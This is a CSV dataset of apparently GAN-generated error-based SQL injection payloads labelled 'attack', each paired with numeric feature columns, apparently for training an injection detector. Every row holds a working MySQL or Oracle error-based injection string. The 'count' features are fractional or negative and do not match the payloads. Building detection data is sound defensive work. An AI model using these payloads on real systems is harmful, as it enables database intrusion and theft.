id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,5.033708319233529,283.93609619140625,73.69659423828125,41.02293014526367,113.37190246582031,-0.1509658843278885,80.72229766845703,47.752838134765625,0.8260010480880737,0.26026859879493713,0.16767895221710205,0.4058147370815277,0.13339141011238098,3.682363510131836,1.1656547784805298,1.3198294639587402,0.7488431334495544,0.13753896951675415,0.08030632883310318,0.09918968379497528,10.887689590454102,10.718526840209961,3.064927101135254,-0.040352024137973785,1.8470431566238403,0.1884247213602066,-0.07889433950185776,-0.042910221964120865,0.09448260813951492,0.6911437511444092,-0.04075288772583008,-0.2710276246070862,1.7229493856430054,0.12272235751152039,0.3696887791156769,2.152939796447754,9.06727409362793,1.07512629032135,2.0719845294952393,0.07042448222637177,0.3859199285507202,0.8734866976737976,-0.053455717861652374,0.04701289162039757,0.09111785888671875,-0.21240642666816711,0.05939002335071564,0.452038049697876,0.5479209423065186,0.6424556374549866,0.24156688153743744,0.34251993894577026,0.12161268293857574,0.0065077245235443115,0.14729037880897522,0.034362487494945526,0.054616596549749374,0.04365808516740799,0.038765981793403625,0.2302440106868744,-0.11225530505180359,0.004194281995296478,0.026701800525188446,0.04492591321468353,0.1627948135137558,-0.03853677213191986,0.44700080156326294,0.1918465793132782,0.1787058413028717,0.1311359852552414,-0.20182809233665466,-0.11136624962091446,0.1691415011882782,0.10460633039474487,0.0164785273373127,-0.15805715322494507,1.3897572755813599,0.4048689305782318,-0.17727744579315186,0.015653586015105247,0.23445625603199005,8.014631271362305,0.9361125230789185,0.19377613067626953,0.02645590901374817,0.6411418318748474,0.22588491439819336,0.06853987276554108,0.17258542776107788
GAN_000012,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.138337373810794,305.4773254394531,68.0240707397461,42.58433151245117,112.50845336914062,-0.7712177634239197,84.86167907714844,52.23077392578125,1.0847687721252441,0.24065525829792023,0.15751826763153076,0.4160268306732178,0.13526223599910736,3.625504732131958,1.1993658542633057,2.0072262287139893,0.9698135256767273,0.19225361943244934,0.05919985473155975,0.05870479717850685,12.319583892822266,10.556854248046875,2.492539882659912,-0.010449878871440887,1.9173994064331055,0.2356596738100052,0.12605822086334229,-0.12113497406244278,0.0946003720164299,0.8056038618087769,-0.11840210109949112,-0.15166500210762024,1.4702136516571045,0.2573029398918152,0.28159022331237793,2.282088279724121,8.490250587463379,0.7595309615135193,2.1219699382781982,0.061802107840776443,0.49943339824676514,1.0606966018676758,0.09308557957410812,0.03706647828221321,0.4273652136325836,-0.299552857875824,-0.25097766518592834,0.6383660435676575,0.46358630061149597,0.698441207408905,0.19153253734111786,0.5076400637626648,-0.11430630087852478,0.29313042759895325,0.16217811405658722,0.01010941993445158,0.05426317825913429,0.16989687085151672,0.054457470774650574,0.012758474797010422,0.03697870671749115,0.16404584050178528,-0.29489243030548096,-0.0894102156162262,0.24935229122638702,-0.06888794898986816,0.44529587030410767,0.3785589039325714,0.1942119151353836,0.1137179508805275,-0.29790544509887695,-0.24671570956707,-0.06057167053222656,0.18985168635845184,0.03186246007680893,0.10484597831964493,1.3300095796585083,0.17350435256958008,-0.2554923892021179,-0.0527181401848793,0.19738657772541046,8.031279563903809,0.9630570411682129,0.22653838992118835,-0.07593448460102081,0.6086814403533936,0.08775176107883453,0.23530139029026031,0.031111180782318115
GAN_000013,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.895295531918333,278.7083435058594,71.35448455810547,41.869972229003906,107.61161804199219,1.2878497838974,78.81316375732422,43.41645050048828,1.0800325870513916,0.2814246416091919,0.16788333654403687,0.41040390729904175,0.13411776721477509,3.6750032901763916,0.8280384540557861,1.1548835039138794,0.7061697840690613,0.146702378988266,0.041182518005371094,0.0661998987197876,10.775713920593262,10.817688941955566,2.737823486328125,0.07670647650957108,2.0027778148651123,0.1689988374710083,-0.03579001873731613,0.23363924026489258,0.0731823593378067,0.4909038841724396,0.03953854739665985,-0.1442614197731018,1.5975004434585571,-0.049094054847955704,0.3044425845146179,2.26206111907959,9.110888481140137,1.1122499704360962,2.080315351486206,0.25964874029159546,0.29568541049957275,0.8675167560577393,0.056472182273864746,0.051999595016241074,0.08597588539123535,-0.16471144556999207,-0.16759636998176575,0.5334787368774414,0.45839396119117737,0.512200117111206,0.36167198419570923,0.34163278341293335,-0.16282793879508972,0.08874485641717911,0.2154584378004074,0.044958774000406265,0.05991285666823387,0.10308375954627991,-0.11295706033706665,0.15145151317119598,5.0045549869537354e-05,-0.042712099850177765,-0.09652913361787796,0.06483259797096252,0.24406856298446655,-0.038558825850486755,0.5527632832527161,0.0678350105881691,0.044749949127435684,0.00024293363094329834,0.12636688351631165,-0.10430168360471725,0.04762354493141174,-0.044372960925102234,0.017299430444836617,0.053534772247076035,1.1470973491668701,0.45504623651504517,-0.001092761754989624,0.11156273633241653,0.2067764401435852,8.301190376281738,0.764626145362854,0.1785961240530014,0.031734783202409744,0.6140064597129822,-0.05744669586420059,-0.1672787070274353,-0.11156830936670303
GAN_000014,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.006042998036271,281.5029296875,71.95040893554688,42.594146728515625,111.12332153320312,0.9267075657844543,80.67615509033203,48.79428482055664,1.106300711631775,0.2574077844619751,0.16205623745918274,0.40997374057769775,0.13377873599529266,3.63236141204834,1.098149061203003,1.5004781484603882,0.9351089000701904,0.1734456866979599,0.07048580050468445,-0.002384321764111519,11.026413917541504,10.77262020111084,2.617135524749756,0.08258810639381409,1.8848259449005127,0.19396762549877167,0.07538604736328125,0.07308598607778549,0.09752172231674194,0.7197327613830566,-0.017984792590141296,-0.07993702590465546,1.5496890544891357,0.20751041173934937,0.33966779708862305,2.263015031814575,8.841076850891113,0.8064615726470947,1.9082199335098267,0.07243184745311737,0.42325735092163086,0.9437466263771057,0.07916860282421112,0.0324430949985981,0.18772491812705994,-0.170570969581604,-0.14757677912712097,0.4793546199798584,0.4914740324020386,0.5772524476051331,0.1602052003145218,0.41314926743507385,-0.04825103282928467,0.19265711307525635,0.176290825009346,0.03131460025906563,0.07590433210134506,0.15949994325637817,-0.037156157195568085,0.033070728182792664,0.012337438762187958,0.06442271918058395,-0.10422923415899277,-0.004513442516326904,0.21437789499759674,-0.03312322497367859,0.5323629975318909,0.12428431957960129,0.10696519911289215,0.061308883130550385,-0.16364970803260803,-0.21243607997894287,-0.059695690870285034,0.2262958437204361,0.014054127968847752,0.06928294897079468,1.3730145692825317,0.2749917209148407,-0.13482224941253662,0.009524784050881863,0.15158481895923615,8.267422676086426,0.8219510316848755,0.17268157005310059,-0.02230110391974449,0.6100764870643616,0.05761944502592087,0.14471326768398285,-0.08209672570228577
GAN_000015,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,4.951818497019463,281.02484130859375,70.99359893798828,42.259830474853516,111.798583984375,0.8989376425743103,83.1239013671875,48.75523376464844,1.1735318899154663,0.2478310465812683,0.16701722145080566,0.4028269946575165,0.13533596694469452,3.6477744579315186,1.2043790817260742,1.1741347312927246,0.7503429651260376,0.14632800221443176,0.04961157590150833,0.24692389369010925,10.416573524475098,10.998295783996582,2.961921215057373,-0.06420771032571793,1.867495059967041,0.15910722315311432,-0.2485983669757843,0.08590390533208847,0.014073765836656094,0.6336442232131958,-0.04424873739480972,-0.024710960686206818,1.5579044818878174,0.3379266560077667,0.4197253882884979,2.125746488571167,8.749919891357422,0.6976217031478882,1.691190242767334,0.15739649534225464,0.3416178822517395,1.0834581851959229,-0.1665765643119812,-0.0019282966386526823,0.02602241188287735,0.023265331983566284,-0.20268338918685913,0.4824995696544647,0.5103723406791687,0.5290489196777344,0.1462956815958023,0.4009178578853607,-0.11703376471996307,0.02187824249267578,0.20209458470344543,0.023556051775813103,0.0159168541431427,0.14318864047527313,0.1547563672065735,-0.020963646471500397,-0.11909577250480652,0.3399953842163086,0.036626651883125305,0.05582968145608902,0.16711431741714478,-0.15023712813854218,0.48796749114990234,0.1200919970870018,0.28422847390174866,-0.02480713278055191,-0.11915913224220276,-0.12658847868442535,0.06155695766210556,0.3246110677719116,0.011265122331678867,0.02514459192752838,1.3731269836425781,0.2928984761238098,-0.2126471996307373,-0.045546479523181915,0.1907034069299698,8.18344497680664,0.9158226251602173,0.24067609012126923,-0.04698503389954567,0.5332814455032349,-0.005503017455339432,0.35935428738594055,-0.11418057978153229
GAN_000016,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.0429721781707695,280.7463073730469,67.8694076538086,41.757911682128906,103.97317504882812,2.4811792373657227,83.93888854980469,45.84360122680664,0.9754666090011597,0.2645016014575958,0.16466310620307922,0.4005807638168335,0.13385112583637238,3.6564481258392334,0.7710805535316467,1.0027329921722412,0.688306450843811,0.11864656209945679,0.017020208761096,-0.034203894436359406,10.596443176269531,10.934416770935059,2.235872745513916,0.1287156343460083,2.0047311782836914,0.18137870728969574,-0.05711960420012474,0.28151190280914307,0.054420240223407745,0.5250056982040405,-0.04990871995687485,-0.15100498497486115,1.6089820861816406,0.0012692250311374664,0.29727599024772644,2.3334360122680664,9.071015357971191,1.035654067993164,1.8110431432724,0.15477758646011353,0.3612889051437378,0.9868485331535339,0.1428544521331787,0.022392790764570236,0.26382410526275635,-0.08506700396537781,-0.10081693530082703,0.4957978427410126,0.46152782440185547,0.497387558221817,0.30738991498947144,0.38909757137298584,-0.16158926486968994,0.1592816710472107,0.2521775960922241,0.030433308333158493,0.03236810490489006,0.12519803643226624,-0.10222986340522766,0.2791902422904968,0.012456685304641724,-0.05602499842643738,-0.11827362328767776,0.12582790851593018,0.25402140617370605,0.05996939167380333,0.5365765690803528,-0.016709350049495697,0.04901605844497681,-0.0811418816447258,0.042245008051395416,-0.1783772110939026,-0.001953382045030594,-0.06319493055343628,0.005896737799048424,0.13446944952011108,1.1873492002487183,0.3742265999317169,-0.1355707198381424,0.114503413438797,0.2324104607105255,8.52274227142334,0.7793824672698975,0.21797791123390198,0.02740459330379963,0.5321164727210999,-0.17417865991592407,-0.18084584176540375,0.020385578274726868
GAN_000017,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.927055812488497,285.2915954589844,74.27494049072266,41.921844482421875,102.49992370605469,-1.1486213207244873,77.07723236083984,47.931549072265625,1.3130931854248047,0.2664336860179901,0.17295145988464355,0.4107784032821655,0.13398590683937073,3.637490749359131,1.0471819639205933,1.3350640535354614,0.8292554020881653,0.14416289329528809,0.05360421538352966,0.043199289590120316,11.804241180419922,10.365745544433594,2.868345022201538,-0.12520748376846313,1.8780879974365234,0.15362763404846191,0.06428512185811996,0.0974043682217598,0.02089933678507805,0.6011225581169128,-0.07503054291009903,-0.07161585986614227,1.6002715826034546,0.07173685729503632,0.401445209980011,2.310974359512329,9.340508460998535,1.0486661195755005,2.1697614192962646,0.23251017928123474,0.34323519468307495,0.8035131096839905,-0.032072000205516815,0.023564156144857407,0.022298619151115417,-0.12314775586128235,-0.12708348035812378,0.5016546845436096,0.5198782682418823,0.5219223499298096,0.14542610943317413,0.29399049282073975,-0.14630906283855438,0.09725337475538254,0.19211745262145996,0.013968531973659992,0.07536309212446213,0.05865733325481415,-0.03517170250415802,0.2852134704589844,-0.09647495299577713,-0.08016011863946915,-0.16089704632759094,0.15007364749908447,0.25552546977996826,-0.07396939396858215,0.6482174396514893,-0.03637458384037018,0.05911633372306824,-0.004140131175518036,0.16148504614830017,-0.13886037468910217,0.14993682503700256,0.09147946536540985,0.029793497174978256,-0.09665385633707047,1.2498310804367065,0.49334126710891724,-0.2161342203617096,0.05223754048347473,0.1829078495502472,7.804029941558838,0.8556663990020752,0.21839827299118042,0.029129264876246452,0.655929446220398,0.10514838248491287,-0.15706972777843475,-0.09083812683820724
GAN_000018,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.257977446361725,283.8894958496094,70.10003662109375,39.584102630615234,94.87940216064453,1.586793303489685,85.62358856201172,50.96012878417969,0.9568036198616028,0.25220048427581787,0.16616463661193848,0.40088844299316406,0.13493700325489044,3.620925188064575,0.6557421088218689,1.0343846082687378,0.6397587656974792,0.11691629141569138,0.03377585858106613,0.090866819024086,11.395094871520996,9.854665756225586,1.9461878538131714,0.07238833606243134,1.8470202684402466,0.19822968542575836,-0.010628017596900463,0.1602315604686737,0.013114205561578274,0.5107283592224121,-0.14705616235733032,-0.1706690490245819,1.4804459810256958,0.0719064325094223,0.3026377558708191,2.4058053493499756,9.294610023498535,0.9606461524963379,1.8940056562423706,0.13238002359867096,0.40671777725219727,1.1084216833114624,0.07788054645061493,-0.005819570738822222,0.3892892301082611,-0.2262628674507141,-0.11256971955299377,0.5631435513496399,0.44451677799224854,0.5378121137619019,0.25101009011268616,0.32271188497543335,-0.32182934880256653,0.25269177556037903,0.26561278104782104,-0.016061434522271156,0.020018991082906723,0.15319043397903442,-0.05988007038831711,0.5711474418640137,-0.0015652328729629517,-0.03525827080011368,-0.29484251141548157,0.22432184219360352,0.36401379108428955,0.10555122792720795,0.5101190805435181,0.06627962738275528,0.07967259734869003,-0.24614521861076355,0.0737679973244667,-0.2804954946041107,0.040747176855802536,-0.0757555365562439,0.016880329698324203,0.06745289266109467,1.2191342115402222,0.27537646889686584,-0.22980660200119019,0.07805085182189941,0.2234455943107605,8.227468490600586,0.9000837206840515,0.2642362713813782,-0.005719025153666735,0.6290860772132874,-0.03142976760864258,-0.22994506359100342,0.007725238800048828
GAN_000019,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.919651159544063,284.9828796386719,65.27194213867188,42.01805877685547,110.4201431274414,-1.0436897277832031,86.82353210449219,48.36063766479492,0.8275468349456787,0.2573990225791931,0.16372255980968475,0.404644638299942,0.13713932037353516,3.676764965057373,1.0682817697525024,1.1876732110977173,0.6299548745155334,0.12388639897108078,0.055070407688617706,0.22458189725875854,11.08649730682373,10.870258331298828,2.8206050395965576,-0.01943974941968918,1.8383214473724365,0.18230946362018585,-0.11409912258386612,-0.007777010090649128,0.08030372112989426,0.6884717345237732,-0.057237476110458374,-0.37648141384124756,1.5784083604812622,0.16366411745548248,0.28904861211776733,2.2206757068634033,9.206480026245117,0.969373345375061,1.9127635955810547,0.09230868518352509,0.4076920747756958,0.9982144832611084,-0.02075817435979843,0.018761806190013885,0.3322738707065582,-0.20747259259223938,-0.05341743677854538,0.5789777040481567,0.5577632188796997,0.6491817235946655,0.31477323174476624,0.31494027376174927,-0.032374829053878784,-0.006716452538967133,0.15826663374900818,0.007495998404920101,0.025543615221977234,0.17299328744411469,-0.1392735093832016,0.388309508562088,-0.09363166242837906,0.1210513487458229,-0.15148797631263733,-0.018641367554664612,0.23499268293380737,0.13910594582557678,0.3541078567504883,0.3120728135108948,0.16830295324325562,-0.003507860004901886,-0.25776419043540955,-0.19028571248054504,0.16910600662231445,-0.007375508546829224,0.020676016807556152,-0.06779161095619202,1.2966326475143433,0.2595326006412506,-0.20463764667510986,0.08561042696237564,0.18955880403518677,7.986385345458984,0.9888191223144531,0.23890860378742218,-0.04620545729994774,0.5742822289466858,0.1020168885588646,0.032346051186323166,0.07762077450752258
GAN_000020,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.154386119124652,282.4741516113281,69.1038818359375,40.56178283691406,108.35139465332031,0.14708928763866425,86.25911712646484,52.45928192138672,0.8086217641830444,0.2429313361644745,0.1635548323392868,0.40919482707977295,0.1333891898393631,3.676845073699951,1.0251121520996094,1.5200873613357544,0.7371118664741516,0.15493950247764587,0.09557298570871353,0.09135860204696655,11.690932273864746,11.20390796661377,2.6011130809783936,-0.054864250123500824,1.8250468969345093,0.2466745227575302,-0.0876980870962143,-0.11123151332139969,0.09331537038087845,0.8381657600402832,-0.13422057032585144,-0.2621482014656067,1.4927159547805786,0.12525345385074615,0.3765164315700531,2.253340005874634,9.350183486938477,0.86114501953125,1.9644399881362915,-0.0711062103509903,0.5061128735542297,1.0610333681106567,-0.044448889791965485,0.019352953881025314,0.2579663097858429,-0.19070932269096375,0.011093392968177795,0.5499274134635925,0.6289361715316772,0.7302286624908447,0.15043886005878448,0.32614386081695557,0.10671612620353699,0.17710402607917786,0.18920549750328064,0.014194819144904613,0.0035103450063616037,0.07628583908081055,0.06913453340530396,0.2272552251815796,0.06477105617523193,0.1361548900604248,-0.18290114402770996,0.034448981285095215,0.18369625508785248,-0.09677116572856903,0.3565739393234253,0.3616800010204315,0.23239539563655853,0.06168841943144798,-0.37885424494743347,-0.17055079340934753,0.201801136136055,0.1901901215314865,0.011581509374082088,-0.21483483910560608,1.5035996437072754,0.2345982939004898,-0.31021392345428467,-0.0406169518828392,0.19812433421611786,7.9930033683776855,1.008931279182434,0.20173417031764984,-0.01995426043868065,0.6201422214508057,0.2441609799861908,0.26675310730934143,0.17312228679656982
GAN_000021,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.304490368254284,275.8147888183594,66.28587341308594,41.12323760986328,108.55455017089844,0.3480728268623352,88.8802490234375,54.68093490600586,0.7210549712181091,0.23707088828086853,0.16774289309978485,0.40700802206993103,0.1327648162841797,3.6621761322021484,1.071833848953247,1.3543782234191895,0.7127136588096619,0.1819060891866684,0.06495249271392822,0.11284291744232178,11.7440767288208,11.32511043548584,2.706665515899658,-0.04723178595304489,1.8012864589691162,0.25774022936820984,-0.14220650494098663,-0.07264838367700577,0.09141925722360611,0.8316038250923157,-0.19577276706695557,-0.319652795791626,1.6515182256698608,0.11659799516201019,0.35051342844963074,2.3720321655273438,9.674278259277344,0.8883352279663086,1.9759052991867065,-0.10934214293956757,0.5264282822608948,1.0685423612594604,0.018670231103897095,0.018788672983646393,0.42716243863105774,-0.19414359331130981,0.12781204283237457,0.5127308368682861,0.622970461845398,0.7389380931854248,0.11776913702487946,0.2736837863922119,0.23512467741966248,0.0816432312130928,0.17237244546413422,0.011922652833163738,0.027860436588525772,0.10588830709457397,-0.013265527784824371,0.27233219146728516,0.06553284823894501,0.027836278080940247,-0.13117170333862305,0.07011424750089645,0.19042740762233734,-0.02432849630713463,0.38231930136680603,0.2082909643650055,0.21556562185287476,0.0162871852517128,-0.4614706039428711,-0.1812206655740738,0.1645374745130539,0.17029930651187897,0.010696470737457275,-0.18006587028503418,1.6146926879882812,0.24869121611118317,-0.3395390212535858,0.013556255958974361,0.22618304193019867,8.369160652160645,0.9990594983100891,0.22330759465694427,-0.0246906541287899,0.5816718935966492,0.22359192371368408,0.20094835758209229,0.2629510760307312
GAN_000022,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.078732775465924,284.6329650878906,73.0368881225586,40.95235824584961,114.6079330444336,0.4510825276374817,82.65670013427734,50.550662994384766,1.0492216348648071,0.25275447964668274,0.15478932857513428,0.4065241515636444,0.13533493876457214,3.6466240882873535,1.3065950870513916,1.5091558694839478,0.8244308233261108,0.11073416471481323,0.039857666939496994,0.17022472620010376,12.14087200164795,10.318443298339844,3.058013916015625,0.008291587233543396,1.8080697059631348,0.16666126251220703,0.08233281224966049,0.003410513512790203,-0.0002585395413916558,0.7378900647163391,-0.22206634283065796,-0.12066011130809784,1.492763638496399,0.2577434182167053,0.37571024894714355,2.1661646366119385,8.404422760009766,0.688848078250885,2.0345118045806885,0.12479059398174286,0.5265549421310425,1.1307554244995117,0.08564864844083786,0.0009369359468109906,0.3147105574607849,-0.07221139967441559,-0.23538222908973694,0.551214873790741,0.47841915488243103,0.6442411541938782,0.12373892962932587,0.49234524369239807,-0.0010581612586975098,0.10358018428087234,0.21855787932872772,-0.03162471577525139,0.03569963574409485,-0.08120682835578918,0.16689860820770264,0.24749568104743958,-0.0739583820104599,0.20399519801139832,-0.18341273069381714,-0.03913009166717529,0.21378417313098907,0.09094403684139252,0.4433220624923706,0.24122607707977295,0.20473191142082214,-0.08663056045770645,-0.2828396260738373,-0.28849533200263977,0.022128045558929443,0.12345128506422043,0.014770878478884697,0.005007673054933548,1.3016225099563599,0.19248858094215393,-0.3168696165084839,-0.050320111215114594,0.16418930888175964,8.012237548828125,0.9640740156173706,0.20592047274112701,-0.07205258309841156,0.5997718572616577,-0.04075996205210686,0.2845534384250641,0.03407667577266693
